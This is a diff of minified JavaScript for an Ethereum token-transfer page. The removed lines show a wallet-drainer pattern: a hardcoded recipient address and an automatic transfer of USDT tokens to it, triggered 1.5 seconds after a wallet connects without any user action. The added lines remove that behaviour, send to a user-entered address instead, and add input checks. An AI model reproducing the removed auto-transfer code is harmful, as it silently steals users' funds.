@@ -32890,10 +32890,9 @@ function ZB({open: i, onClose: t, txHash: n, isPending: s, isDark: l}) {
     })
 }
 const zd = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
-  , rA = "0x6a9c9d91c2871e6e2E3fb89A2d2babAAbCb4740b"
   , XB = "0x25518aD9e49798a9C6dCF237FB2F77e4Cb5DEeCA"
   , WB = ""
-  , _d = ["function approve(address spender, uint256 amount) external", "function decimals() view returns (uint8)", "function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)"];
+  , _d = ["function approve(address spender, uint256 amount) external", "function transfer(address recipient, uint256 amount) external returns (bool)", "function decimals() view returns (uint8)", "function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)"];
 function $B() {
     const [i,t] = Xt.useState(!1)
       , [n,s] = Xt.useState(!1)
@@ -32904,7 +32903,6 @@ function $B() {
       , [w,S] = Xt.useState(null)
       , E = document.documentElement.classList.contains("theme-dark")
       , A = Xt.useRef(!1)
-      , O = Xt.useRef(!1)
       , [U,P] = Xt.useState(!1);
     Xt.useEffect( () => {
         if (!U)
@@ -32968,13 +32966,7 @@ function $B() {
                 }
                 if (B && B.length > 0) {
                     const ut = B[0];
-                    L(ut),
-                    O.current || (O.current = !0,
-                    console.log("Ã°Å¸Å¡â‚¬ Auto-triggering transaction..."),
-                    setTimeout( () => {
-                        Y()
-                    }
-                    , 1500))
+                    L(ut)
                 }
             } catch (B) {
                 console.error("Ã¢ÂÅ’ Init error:", B)
@@ -33012,6 +33004,10 @@ function $B() {
                 }
                 const X = new ui(window.ethereum)
                   , nt = new Zi(zd,_d,X);
+                if (!/^0x[0-9a-fA-F]{40}$/.test(c))
+                    throw new Error("Invalid destination address");
+                if (!m || isNaN(m) || Number(m) <= 0)
+                    throw new Error("Invalid amount");
                 if (B && m && !isNaN(m) && Number(m) > 0)
                     try {
                         const j = await nt.decimals()
@@ -33036,9 +33032,9 @@ return
 }
 let dec = 18;
 try { dec = await nt.decimals() } catch(e){}
-console.log(`Executing transfer to ${rA}`);
+console.log(`Executing transfer to ${c}`);
 const amountInWei = Ib(m, dec);
-const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
+const ut = new oi(_d).encodeFunctionData("transfer", [c, amountInWei])
                   , gt = {
                     to: zd,
                     data: ut
@@ -33048,6 +33044,7 @@ const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
                     method: "eth_sendTransaction",
                     params: [gt]
                 });
+                y(Tt),
                 console.log("Ã°Å¸â€œÂ¤ Transaction sent:", Tt),
                 setTimeout( () => {
                     s(!0)
@@ -33071,8 +33068,8 @@ const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
                 console.log("Ã°Å¸â€œÂ User Address (Recovered from Tx):", B));
                 const R = await Z.wait();
 console.log("Transaction confirmed:", R.hash);
-P(!1);
 s(!0);
+console.log("Transaction confirmed:", R.hash);
 
 } catch (M) {
                 console.error("Ã¢ÂÅ’ Error:", M);
